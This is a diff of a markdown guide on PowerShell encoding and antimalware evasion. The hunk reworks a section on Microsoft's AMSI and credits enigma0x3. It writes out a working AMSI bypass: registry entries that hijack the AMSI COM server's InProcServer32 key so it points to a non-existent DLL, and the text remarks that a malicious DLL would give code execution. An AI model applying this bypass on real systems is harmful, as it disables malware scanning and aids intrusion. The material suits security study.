@@ -706,20 +706,23 @@ Here we can view the all process of encoding/decoding in powershell console
 
       Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
       that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
-      [ Special thanks to enigma0x3 ]
 
-      Since the COM server is resolved via the HKCU hive first, a normal user can hijack the InProcServer32
-      key and register a non-existent DLL (or a malicious one if you like code execution). In order to do
-      this, there are two registry entries that need to be made:
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/6y9yF9.png)
 
 <br />
+
+- AMSI .COM Object DLL hijacking [ enigma0x3 ]
+
+      [ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive first, a normal user can hijack
+      the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution).
+      In order to do this, there are two registry entries that need to be made:
+
 
       Windows Registry Editor Version 5.00
       [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
       [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
-      @="C:\\goawayamsi.dll"
+      @="C:\\IDontExist.dll"
 
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/VUXoF6.png)
 
       When AMSI attempts to instantiate its COM component, it will query its registered CLSID and return a
       non-existent COM server. This causes a load failure and prevents any scanning methods from being
